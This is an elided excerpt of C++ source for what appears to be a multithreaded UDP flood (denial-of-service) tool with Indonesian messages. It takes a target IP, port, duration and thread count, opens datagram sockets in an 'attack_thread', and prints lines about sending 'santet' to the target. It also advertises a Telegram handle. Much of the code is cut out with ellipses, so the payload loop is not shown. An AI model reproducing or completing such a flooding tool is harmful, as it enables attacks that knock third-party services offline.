...
public:
    ...
    void attack_thread() {
        ...
        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("Paku santet tidak terdeteksi");
            pthread_exit(NULL);
        }
...
void usage() {
    std::cout << "Penggunaan: ./sut IP PORT DURASI PROSES\n";
    exit(1);
}
...
int main(int argc, char *argv[]) {
    ...
    std::cout << "Santet sedang dikirim ke " << ip << ":" << port << " selama " << duration << " detik dengan proses " << threads << " sebanyak\n";
    ...
    for (int i = 0; i < threads; i++) {
        ...
        if (pthread_create(&thread_ids[i], NULL, [](void* arg) -> void* {
            ...
            perror("Proses santet gagal");
            exit(1);
        }
        std::cout << "STX mengirim santet menggunakan paku santet berlabel: " << thread_ids[i] << "\n";
    }
    ...
    std::cout << "Done ga bang ?. support telegram @suttdiam69\n";
    return 0;
}
